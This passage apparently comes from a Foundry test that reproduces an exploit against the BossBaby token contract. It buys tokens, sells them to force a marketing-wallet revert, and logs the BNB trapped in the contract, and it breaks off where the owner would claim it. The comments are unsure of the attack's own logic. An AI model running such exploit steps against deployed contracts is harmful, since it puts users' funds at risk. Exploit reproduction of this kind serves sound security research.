        router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: 1 ether}(
            0,
            path,
            attacker,
            block.timestamp
        );

        vm.stopPrank();
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Step 1: Check initial BNB balance of attacker
        uint256 initialBalance = address(attacker).balance;

        // Step 2: Sell tokens to trigger swapAndSendMarketing which will revert
        vm.startPrank(attacker);

        // Get token balance
        uint256 tokenBalance = BossBaby(TARGET).balanceOf(attacker);

        // Approve router to spend tokens
        BossBaby(TARGET).approve(address(router), tokenBalance);

        // Sell all tokens - this should trigger swapAndSendMarketing which will revert
        // due to malicious wallet, but the swap might still happen?
        // Actually, the entire transaction will revert if sendValue fails
        // We need to catch this revert
        path[0] = TARGET;
        path[1] = weth;

        try router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenBalance,
            0,
            path,
            attacker,
            block.timestamp
        ) {
            // If it doesn't revert, we still continue
        } catch {
            // Transaction reverted as expected due to marketing wallet
            console.log("Swap reverted due to malicious marketing wallet");
        }

        vm.stopPrank();

        // Step 3: Check contract BNB balance - some BNB should be trapped
        uint256 contractBNBBalance = address(TARGET).balance;
        console.log("Contract BNB balance:", contractBNBBalance);

        // Step 4: As owner, claim the stuck BNB
